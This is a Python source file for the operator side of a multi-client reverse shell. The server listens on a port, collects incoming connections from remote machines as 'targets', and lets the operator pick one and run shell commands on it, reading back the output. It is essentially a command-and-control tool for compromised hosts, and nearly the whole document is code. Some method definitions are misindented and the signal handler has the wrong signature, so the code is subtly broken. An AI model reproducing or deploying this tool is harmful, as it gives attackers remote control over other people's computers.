#---------------------------------------------PYTHON-3-MULTI-CLIENT-SUPPORTED-REVERSE-SHELL------------------------------------------------------------

# Required modules

import socket
import sys
import threading
import time
import signal
import struct
from queue import Queue

No_of_jobs = [1, 2]
No_of_threads = 2
queue = Queue()

# Options

Commands = {
            'help       :': 'Show the help menu.',
            'list       :': 'List all the available connections.',
            'select     :': 'Select the specific client by it\'s serial no. Takes index as a parameter.',
            'quit       :': 'Stop the current session with the client. Will be used when the client is being selected.',
            'shutdown   :': 'Shutdown the server.'
            }

# Creating a class Multiclient_server

class Multiclient_server:
    def __init__(self):
        self.host = ""                             # specify your host ip.static ip would be much preferred.
        self.port = 4321                           # make sure that not to mention well-known ports
        self.socket = None
        self.all_addresses = []
        self.all_connections = []

# Print the help option
    
    def print_help(self):
        for cmd, val in Commands.items():
            print(cmd+'\t\t'+val)
        return

# Signal handling for termination
    
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.terminate_conn)
        signal.signal(signal.SIGTERM, self.terminate_conn)
        return

# Terminating the connections
   
   def terminate_conn(self):
        print('[+] terminating the connection')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as msg:
                print('[!] Unable to terminate the connection\nProblem:', str(msg))
        self.socket.close()
        sys.exit()

# Socket creation
    
    def create_socket(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print(f'[!] Error occurred in creating sockets:---\n{str(msg)}')
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

# Bind the socket and listen for the incoming connections
   
   def socket_bind(self):
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error:
            print('[!] Error occurred while binding socket')
            time.sleep(3)
            self.socket_bind()
        return

# Accepting the incoming connections from the clients
    
    def accepting_connections(self):
        for c in self.all_connections:
            c.close()
        while True:
            try:
                conn, addr = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode('utf-8')
                addr = addr + (client_hostname,)
            except socket.error:
                print('[!] Error occurred in accepting connection')
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(addr)
            print(f'[+] Connection has been established from User:{addr[2]} ({addr[0]}) via port:{str(addr[1])}')
        return

# start py_prompt (Interactive shell for this program)
    
    def start_pyprompt(self):
        while True:
            cmd = input('py_prompt>>')
            if cmd == 'list':
                self.list_all_connections()
                continue
            elif 'select' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_cmds(target, conn)
            elif cmd == 'shutdown':
                queue.task_done()
                queue.task_done()
                print('[+] Server shutting down!')
            elif cmd == 'help':
                self.print_help()
            elif cmd == '':
                pass
            else:
                print('[?] Command not recognized. :/')
        return

# This method is for listing all current available connections
    
    def list_all_connections(self):
        results = ""
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(" "))
                conn.recv(500000)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(self.all_addresses[i][1]) + '   ' +str(
                self.all_addresses[i][2]) + '\n'
        print('....Current_Targets....'+'\n' + results)
        return

# Behaviour of this method is to get a specific target from the list
    
    def get_target(self, cmd):
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('[!] Client index number must be an integer.')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('[!] Invalid selection.')
            return None, None
        print('You\'re now interacting with ' + str(self.all_addresses[target][2]+' Execute the cmds of appropriate target\'s OS'))
        return target, conn

# read the msg length and unpack it into integer (parameter = conn)
    
    def read_msg_output(self, conn):
        raw_msg_len = self.recv_all(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        return self.recv_all(conn, msg_len)

#  Helper function to recv n bytes or return None if EOF is hit
    
    def recv_all(self, conn, n):
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

# Sending commands to the target
    
    def send_target_cmds(self, target, conn):
        conn.send(str.encode(" "))
        cwd_bytes = self.read_msg_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_msg_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception :
                print(f"[!] Session closed. Now you are back to py_prompt shell.")
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return

# creating the workers from the Multiclient_server class

def create_workers():
    server = Multiclient_server()
    server.register_signal_handler()
    for _ in range(No_of_threads):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

# Execution according to the subsequent jobs in queue

def work(server):
    while True:
        x = queue.get()
        if x == 1:
            server.create_socket()
            server.socket_bind()
            server.accepting_connections()
        if x == 2:
            server.start_pyprompt()
        queue.task_done()
    return

# Each list item is a new job

def create_jobs():
    for x in No_of_jobs:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()

if __name__ == '__main__':
    main()
    
    
